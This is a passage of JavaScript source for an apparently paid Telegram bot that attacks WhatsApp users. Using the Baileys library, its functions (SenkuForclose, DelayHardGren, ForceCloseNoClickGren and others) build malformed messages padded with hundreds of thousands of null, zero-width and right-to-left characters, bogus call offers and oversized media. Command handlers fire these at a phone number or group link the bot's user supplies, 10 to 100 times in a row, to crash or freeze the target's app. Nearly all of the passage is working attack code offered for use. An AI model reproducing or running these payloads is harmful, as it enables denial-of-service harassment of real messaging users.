                                text: "ꦾ".repeat(30000) + "@1".repeat(60000),
                                contextInfo: {
                                    stanzaId: targetJid,
                                    participant: targetJid,
                                    mentionedJid: Array.from({ length: 10000 }, () => `${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`)
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    
    const Gren2 = {
        interactiveMessage: {
            body: {
                text: "Hello bang"
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_call",
                        buttonParamsJson: JSON.stringify({
                            display_text: "ꦽ".repeat(150000),
                            phone_number: "00000000000000"
                        })
                    }
                ],
                version: 3
            }
        }
    };
    
    await sock.relayMessage(targetJid, Gren, {});
    await sock.relayMessage(targetJid, Gren2, {});
    console.log(`CrashGren sent to ${targetJid}`);
}

async function SenkuForclose(sock, target) {
    const nul = "\u0000";
    const blank = "\u200B";
    const rtl = "\u202E";
    const overflow = nul.repeat(50000) + blank.repeat(50000) + rtl.repeat(50000);

    const ghostPairingPayload = {
        interactiveMessage: {
            header: { title: "@Meta AI", subtitle: "꦳꧀" },
            body: { text: "ᬼ" },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "ᬼ",
                        url: "https://fake-meta-verify.com/" + overflow.substring(0, 1000)
                    })
                }]
            }
        }
    };

    const mediaCrash = {
        imageMessage: {
            url: "https://attacker.com/crash.png" + "ᬼ" + overflow.substring(0, 3000),
            mimetype: "image/jpeg",
            caption: "ᬼ".repeat(5000) + rtl.repeat(5000),
            jpegThumbnail: Buffer.from("FFD8" + "00".repeat(200000) + "FFD9", "hex"),
            fileLength: 999999999999
        }
    };
    
    const statusTagPayload = {
        statusMessage: {
            text: "ZamsNihBang🤓" + overflow.substring(0, 40000),
            mentions: [target]
        }
    };

    const scansSidecar = {
        async scanMessage(sock, target) {
            const scanId = Date.now();
            console.log(`[SCAN] Sidecar activated for ${target} - ID: ${scanId}`);
            return { scanId, target };
        }
    };

    const embeddedMusic = {
        async sendMusic(sock, target) {
            const musicMessage = {
                extendedTextMessage: {
                    text: `🎵 *FORCLOSE COMBO*\n🔥 Target: ${target}\n💀 Status: INJECTED`,
                    previewType: 2,
                    musicMetadata: {
                        title: "Zams Forclose",
                        artist: "Indictive Core",
                        url: "https://t.me/ZamsLikeCrash",
                        durationSec: 999,
                        albumName: "WhatsApp Exploit"
                    }
                }
            };
            await sock.sendMessage(target, musicMessage);
            console.log(`[MUSIC] Embedded music sent to ${target}`);
        }
    };

    console.log(`🚀 FORCLOSE COMBO to ${target}`);
    
    await scansSidecar.scanMessage(sock, target);
    
    await Promise.all([
        sock.relayMessage(target, ghostPairingPayload, { participant: { jid: target } }),
        sock.relayMessage(target, mediaCrash, { participant: { jid: target } }),
        sock.relayMessage(target, statusTagPayload, { participant: { jid: target } })
    ]);
    
    await embeddedMusic.sendMusic(sock, target);
    
    console.log(`✅ wa target forklos bang 🤓 ${target}`);
}

async function durationV2(sock, target) {
    const duration = 10+10+20+30+40+50+60+70+80+90+100+110+120+130+140+150+160+170+180+190+200+210+220+230+240+250+260+270+280+290+300+310+320+330+340+350+360+370+380+390+400+410+420+430+440+450+460+470+480+490+500+510+520+530+540+550+560+570+580+590+600+610+620+630+640+650+660+670+680+690+700+710+720+730+740+750+760+770+780+790+800+810+820+830+840+850+860+870+880+890+900+910+920+930+940+950+960+970+980+990+1000+2000+3000+4000+6000+7000+8000+9000+5000+5000+4000 + "\u0000" + "\u200b" + "\u300b" + "\u600b" + "\u800b" + "\u200b" + "\u0025" + "\u700b";
    const blank = "\u0000".repeat(50000) + "\u300b".repeat(20000);
    const button = "quick_reply" + "single_singlet" + "booking_status" + "cta_url" + "cta_call";

    const Gren = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "GrenXHarimau duration V2",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "cta_url",
                        paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
                        url: "https://mmg.whatsapp.net",
                        merchantUrl: "t.me/GrenTzy",
                        version: 3
                    },
                    disappearingMode: {
                        initiator: "CHANGED_IN_CHAT",
                        trigger: "CHAT_SETTING"
                    },
                    contextInfo: {
                        stickerMessage: {
                            paymentInviteMessage: {
                                serviceType: 4,
                                expiryTimestamp: Date.now() + 9007199254740991,
                                blank: true,
                                button: true,
                                duration: true
                            }
                        }
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, Gren, {});
    console.log("tes tuh kek nya ini work deh kan GrenXHarimau yang buat btw kalau work jangan lupa send record ke GrenTzy🫣");
    console.log("GrenXHarimau terkirim ke " + target);
}

async function DelayHardGren(sock, target) {
    const Gren1 = {
        protocolMessage: {
            type: 11,
            contextInfo: {
                forwardingScore: 999999,
                isForwarded: true,
                forwardedAIBotMessageInfo: {
                    botName: "\u0000".repeat(50000),
                    botJid: ["135555676@s.whatsapp.net"],
                    creatorName: "\u200b".repeat(40000)
                }
            }
        }
    };
const Gren = {
interactiveMessage: {
        body: { text: "GrenXHarimau" },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "Voice_call",
                    buttonParamsJson: JSON.stringify({
                        display_text: "\u800b".repeat(60000),
                        id: "\u200b"
                    })
                }
            ],
            version: 1
        },
        contextInfo: {
            quotedMessage: {
                interactiveMessage: {
                    body: { text: "Gren" }
                }
            }
        }
    }
};
  const type = ["call_permission_request", "audio_button", "sticker_button"];
 
  for (const x of type) {
    const enty = Math.floor(Math.random() * type.length);
    const GrenX = {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "GrenXharimauDelay",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "cta_url",
              paramsJson: `{"flow_cta":"${"\u0000".repeat(999999)}"}`,
              url: "https://mmg.whatsapp.net",
              merchantUrl: "t.me/GrenTzy",
              entryPointConversionSource: type[enty],
              version: 3
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            contextInfo: {
              stickerMessage: {
                paymentInviteMessage: {
                  serviceType: 4,
                  expiryTimestamp: Date.now() + 9007199254740991
                }
              }
            }
          }
        }
      }
    };
    await sock.relayMessage(target, GrenX, {});
  }
    await sock.relayMessage(target, Gren1, {});
await sock.relayMessage(target, Gren, {});
}

async function ForceCloseNoClickGren(sock, target) {
const {
    encodeSignedDeviceIdentity,
    jidDecode,
    encodeWAMessage,
    patchMessageBeforeSending,
    generateMessageTag,
} = require('@whiskeysockets/baileys');

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    const mutexManager = (() => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async (prev) => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    })();
    const mutex = mutexManager.mutex.bind(mutexManager);

    const padBuffer = (buf) => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);

    const originalCreateParticipantNodes = sock.createParticipantNodes?.bind(sock);
    const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let patchedList = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        const { id: meId, lid: meLid } = sock.authState.creds.me;
        const ownPnUser = jidDecode(meId)?.user;
        const ownLidUser = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        const nodes = await Promise.all(
            patchedList.map(async ({ recipientJid: jid, message: msg }) => {
                const { user: targetUser } = jidDecode(jid);
                const isOwnUser = targetUser === ownPnUser || targetUser === ownLidUser;
                const isSelf = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !isSelf) msg = dsmMessage;

                const bytes = padBuffer(
                    originalEncodeWAMessage ? originalEncodeWAMessage(msg) : encodeWAMessage(msg)
                );

                return mutex(jid, async () => {
                    const { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    const expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    const Gren1 = {
    viewOnceMessage: {
        message: {
            messageContextInfo: {
                messageSecret: crypto.randomBytes(32),
                supportPayload: JSON.stringify({
                    version: 3,
                    is_ai_message: true,
                    should_show_system_message: true,
                    ticket_id: crypto.randomBytes(16)
                })
            },
            interactiveMessage: {
                body: { text: 'GrenXHarimau☠️' },
                footer: { text: 'GrenXHarimau☠️' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "quick_reply",
                            buttonParamsJson: JSON.stringify({
                                display_text: "\u0000". repeat(150000),
                                id: "grenx"
                            })
                        }
                    ],
                    messageParamsJson: "\n".repeat(10000)
                },
                contextInfo: {
                    id: sock.generateMessageTag(),
                    forwardingScore: 999,
                    isForwarded: true,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "X",
                    mentionedJid: ["0@s.whatsapp.net"]
                }
            }
        }
    }
};

    await sock.relayMessage(target, Gren1, {
        messageId: null,
        participant: { jid: target },
        userJid: target
    });

    await sock.sendNode(expensionNode);
}

// Case bot pemanggilan 
bot.onText(/\/FcNoClick(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /FcNoClick 62xxxx");
  }

  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: "⏳ Memeriksa akses premium..."
    }).catch(() => null);
    return bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    const activeSock = getActiveSender();
    if (!activeSock) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp aktif. Gunakan /addsender untuk menambah.");
    }
    if (!activeSock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Sender WhatsApp tidak valid. Coba /listsender dan pilih ulang.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "FcNoClick");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ FcNoClick (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 100; i++) {
        console.log(`PROSES SENDING ForceCloseNoClickGren (BUG) 👻 ${i + 1} TO ${q}`);
        try {
          await ForceCloseNoClickGren(sock, target);
        } catch (err) {
          console.error(`Gagal kirim percobaan ${i+1} untuk ${q}:`, err.message);
        }
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /FcNoClick:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/delayv3(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /delayv3 62xxxx");
  }

  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: "⏳ Memeriksa akses premium..."
    }).catch(() => null);
    return bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    const activeSock = getActiveSender();
    if (!activeSock) {
      return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp aktif. Gunakan /addsender untuk menambah.");
    }
    if (!activeSock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Sender WhatsApp tidak valid. Coba /listsender dan pilih ulang.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "delayv3");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ delayv3 (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING delayv3 (BUG) 👻 ${i + 1} TO ${q}`);
        try {
          await durationV2(activeSock, target);
        } catch (err) {
          console.error(`Gagal kirim percobaan ${i+1} untuk ${q}:`, err.message);
        }
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /delayv3:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/delayv2(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /delayv2 62xxxx");
  }

  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: "⏳ Memeriksa akses premium..."
    }).catch(() => null);
    return bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    if (!sock || !sock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Koneksi WhatsApp tidak valid. Silakan hubungkan ulang.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "delayv2");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ delayv2 (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING delayv2 (BUG) 👻 ${i + 1} TO ${q}`);
        try {
          await GrenDelayHarimau(sock, target);
        } catch (err) {
          console.error(`Gagal kirim percobaan ${i+1} untuk ${q}:`, err.message);
        }
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /delayv2:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/delayv1(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /delayv1 62xxxx");
  }

  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg";
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    if (!sock || !sock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Koneksi WhatsApp tidak valid. Silakan hubungkan ulang.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "delayv1");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ delayv1 (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING delayv1 (BUG) 👻 ${i + 1} TO ${q}`);
        try {
          await GrenDelayXharimauV1(sock, target);
          await GrenDelayHarimau(sock, target);
          await GrenXHarimauCombo(sock, target);
        } catch (err) {
          console.error(`Gagal kirim percobaan ${i+1} untuk ${q}:`, err.message);
          
        }
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /delayv1:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/harimaucombo(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /harimaucombo 62xxxx");
  }

  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg";
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "harimaucombo");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ harimaucombo (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING harimaucombo (BUG) 👻 ${i + 1} TO ${q}`);
        await GrenXHarimauCombo(sock, target);
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /harimaucombo:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/fcnoclickfreeze(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /fcnoclickfreeze 62xxxx");
  }

  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg";
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "fcnoclickfreeze");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ fcnoclickfreeze (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING fcnoclickfreeze (BUG) 👻 ${i + 1} TO ${q}`);
        await fcNoClickFreeze(sock, target);
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /fcnoclickfreeze:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/blankclickgren(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  const q = match[1];
  if (!q) {
    return bot.sendMessage(chatId, "🪧 Example: /blankclickgren 62xxxx");
  }

  if (!premiumUsers.some(user => user.id === fromId && new Date(user.expiresAt) > new Date())) {
    const randomImage = "https://files.catbox.moe/wg2jko.jpg";
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\nHubungi @GrenTzy`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }

    const cooldownRemaining = await checkCooldown(fromId, "blankclickgren");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    global.buttonColorIndex = global.buttonColorIndex || 0;
    const buttonStyles = ["primary", "success", "danger"];
    const currentStyle = buttonStyles[global.buttonColorIndex];
    global.buttonColorIndex = (global.buttonColorIndex + 1) % buttonStyles.length;

    await bot.sendMessage(chatId, `✅ blankclickgren (bug) selesai mengirim untuk ${q}`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁",
              url: `https://wa.me/${q}`,
              style: currentStyle
            }
          ]
        ]
      }
    });

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(`PROSES SENDING blankclickgren (BUG) 👻 ${i + 1} TO ${q}`);
        await BlankClickGren(sock, target);
        await sleep(1500);
      }
    })();

  } catch (error) {
    console.error("Error di /blankclickgren:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`).catch(() => {});
  }
});

bot.onText(/\/CrashXGroup (https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const inviteLink = match[1];
  const inviteCode = inviteLink.split('/').pop();
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `❌ Akses Ditolak\nAnda Bukan Pengguna Premium\n( ! ) Tidak ada akses, silahkan beli akses atau script ke owner.\nContact owner di bawah.`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "👑 OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx");
    }
    
    const sock = sessions.values().next().value;
    if (!sock) throw new Error("Tidak ada koneksi WhatsApp aktif");

    let groupInviteInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
    let groupJid;
    if (groupInviteInfo && groupInviteInfo.id) {
      groupJid = groupInviteInfo.id;
    } else {
      const joinResult = await sock.groupAcceptInvite(inviteCode).catch(() => null);
      if (!joinResult) throw new Error("Gagal bergabung ke grup. Periksa link atau bot sudah menjadi anggota?");
      groupJid = joinResult;
    }

    const total = 100; 
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/wg2jko.jpg", {
      caption: `✨ *GREN X CRASH GROUP* ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 *Target Group* : ${inviteLink}
⚙️ *Type* : CrashXGroup
📡 *Status* : 🔥 MEMPROSES 🔥
📊 *Progress* : ▱▱▱▱▱▱▱▱▱▱ 0%
🚀 *Kiriman* : 0/${total}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "🔍 LIHAT GRUP", url: inviteLink }]]
      }
    });

    console.log("[PROSES MENGIRIM CrashXGroup]");

    for (let i = 1; i <= total; i++) {
